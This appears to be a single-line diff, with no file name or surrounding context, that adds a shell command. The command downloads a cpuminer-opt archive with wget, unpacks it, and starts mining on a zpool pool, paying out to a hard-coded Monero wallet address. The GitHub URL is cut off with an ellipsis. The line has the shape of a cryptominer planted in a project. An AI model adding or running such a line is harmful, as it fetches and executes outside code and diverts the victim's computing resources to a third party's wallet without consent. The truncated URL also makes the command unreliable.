@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-o... && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://allium.sea.mine.zpool.ca:6433 -u 89tVwXUyRhV5B98JCogBoGd28UfVRzsRcWMemBpdfEoQWQXb7bHNw9BHYH79A2mxn6V2xEcHvR3aRdvPayJybS2PRtw6EUJ -p c=XMR -t 2
